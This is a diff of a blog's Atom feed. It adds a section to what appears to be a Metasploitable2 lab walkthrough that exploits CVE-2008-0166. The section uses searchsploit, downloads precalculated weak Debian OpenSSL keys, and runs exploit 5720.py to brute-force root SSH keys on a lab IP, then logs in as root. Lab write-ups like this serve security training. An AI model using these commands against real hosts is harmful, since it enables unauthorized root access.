@@ -4,7 +4,7 @@
   <title><![CDATA[Bob1Bob2]]></title>
   <link href="http://wg135.github.io/atom.xml" rel="self"/>
   <link href="http://wg135.github.io/"/>
-  <updated>2016-06-27T16:36:28-05:00</updated>
+  <updated>2016-06-28T15:11:10-05:00</updated>
   <id>http://wg135.github.io/</id>
   <author>
     <name><![CDATA[Bob1Bob2]]></name>
@@ -24,6 +24,7 @@
 <li>Metasploit</li>
 <li>smbclient</li>
 <li>enum4linux</li>
+<li>Nikto</li>
 </ul>
 
 
@@ -491,6 +492,42 @@
 <p>Getting access to a system with a writeable filesystem</p>
 
 <p><a href="https://github.com/wg135/script/blob/master/add_ssh_key.py">add_ssh_key.py</a></p>
+
+<p>Since the nmap shows the openssh version is 4.7. I googled it and find it use Openssl 0.9.8g</p>
+
+<p>search openssl exploit:</p>
+
+<p><code>searchsploit openssl</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/misc/metasploitable2/Selection_019.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Looks like these exploits can be used. The vulnerability is CVE-2008-0166.</p>
+
+<p>I use 5720.py.</p>
+
+<p>First, download precalculated vulnerable keys</p>
+
+<p><code>wget https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/5622.tar.bz2</code></p>
+
+<p>unzip it</p>
+
+<p><code>tar jxf 5622.tar.bz2</code></p>
+
+<p>run the command:</p>
+
+<p><code>python 5720.py rsa/2048/ 192.168.79.179 root 22 5</code></p>
+
+<p>rsa/2048 is the folder contains the keys.</p>
+
+<p>Found keys:</p>
+
+<p><img src="http://wg135.github.io/images/blog/misc/metasploitable2/Selection_020.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>login the box:</p>
+
+<p><code>ssh -l root -p22 -i rsa/2048//c551f0a5d2f76d88b58b3ae90ceb617a-22002 192.168.79.179</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/misc/metasploitable2/Selection_021.png" title="[title manually exploit [alt text]]" ></p>
 
 <h3>SMB exploit:</h3>
 
